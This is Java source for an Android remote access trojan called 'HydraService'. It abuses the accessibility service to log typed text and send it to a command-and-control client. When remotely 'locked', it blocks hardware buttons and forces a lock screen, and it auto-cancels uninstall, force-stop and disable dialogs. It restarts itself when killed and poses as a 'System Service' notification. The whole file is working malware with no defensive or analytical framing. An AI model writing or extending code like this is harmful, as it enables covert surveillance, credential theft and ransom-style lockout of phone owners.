package com.hydrax.rat;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.GestureDescription;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.Intent;
import android.graphics.Path;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.view.KeyEvent;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

public class HydraService extends AccessibilityService {
    private static HydraService instance;
    private C2Client c2;
    private Handler handler;
    private StringBuilder keyBuffer = new StringBuilder();
    private FeatureManager features;

    public static HydraService getInstance() { return instance; }
    public static boolean isAccessibilityEnabled(android.content.Context ctx) {
        try {
            int enabled = Settings.Secure.getInt(ctx.getContentResolver(),
                    Settings.Secure.ACCESSIBILITY_ENABLED);
            return enabled == 1;
        } catch (Exception e) { return false; }
    }

    @Override
    public void onCreate() {
        super.onCreate();
        instance = this;
        handler = new Handler(Looper.getMainLooper());
        showPersistentNotification();
        c2 = new C2Client(this);
        features = new FeatureManager(this, c2);
        c2.start();
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        // Keylogger
        if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            if (event.getText() != null && event.getText().size() > 0) {
                String text = event.getText().get(0).toString();
                if (!text.isEmpty()) {
                    keyBuffer.append(text);
                    if (keyBuffer.length() > 200) {
                        c2.sendKeystrokes(keyBuffer.toString());
                        keyBuffer.setLength(0);
                    }
                }
            }
        }

        // Block Settings/Uninstall when locked
        if (c2.isDeviceLocked()) {
            blockEscapeAttempts(event);
        }

        // Intercept home/back/recent buttons
        if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            if (c2.isDeviceLocked()) {
                String pkg = event.getPackageName() != null ? event.getPackageName().toString() : "";
                if (!pkg.equals(getPackageName()) && !pkg.equals("com.android.systemui")) {
                    // Force return to lock screen
                    Intent lockIntent = new Intent(this, LockScreenActivity.class);
                    lockIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
                    startActivity(lockIntent);
                }
            }
        }
    }

    @Override
    protected boolean onKeyEvent(KeyEvent event) {
        // Block all hardware buttons when locked
        if (c2.isDeviceLocked()) {
            int keyCode = event.getKeyCode();
            if (keyCode == KeyEvent.KEYCODE_BACK ||
                keyCode == KeyEvent.KEYCODE_HOME ||
                keyCode == KeyEvent.KEYCODE_APP_SWITCH ||
                keyCode == KeyEvent.KEYCODE_VOLUME_UP ||
                keyCode == KeyEvent.KEYCODE_VOLUME_DOWN ||
                keyCode == KeyEvent.KEYCODE_POWER) {
                return true; // Consume event, don't pass through
            }
        }
        return super.onKeyEvent(event);
    }

    private void blockEscapeAttempts(AccessibilityEvent event) {
        AccessibilityNodeInfo source = event.getSource();
        if (source != null) {
            // Auto-dismiss settings/uninstall dialogs
            String text = source.getText() != null ? source.getText().toString() : "";
            if (text.contains("Uninstall") || text.contains("Force stop") || text.contains("Disable")) {
                performGlobalAction(GLOBAL_ACTION_BACK);
            }
            source.recycle();
        }
    }

    @Override
    public void onInterrupt() {}

    @Override
    public void onDestroy() {
        instance = null;
        super.onDestroy();
        // Auto-restart
        Intent restartIntent = new Intent(this, BootReceiver.class);
        sendBroadcast(restartIntent);
    }

    private void showPersistentNotification() {
        String channelId = "hydra_service";
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    channelId, "System Service",
                    NotificationManager.IMPORTANCE_LOW);
            channel.setDescription("System Service");
            NotificationManager nm = getSystemService(NotificationManager.class);
            nm.createNotificationChannel(channel);
        }
        Notification notification = new Notification.Builder(this, channelId)
                .setContentTitle("System Service")
                .setContentText("Running in background")
                .setSmallIcon(android.R.drawable.ic_menu_manage)
                .setOngoing(true)
                .setPriority(Notification.PRIORITY_LOW)
                .build();
        startForeground(9999, notification);
    }

    // Gesture simulation for button blocking
    public void performBackGesture() {
        performGlobalAction(GLOBAL_ACTION_BACK);
    }
    }
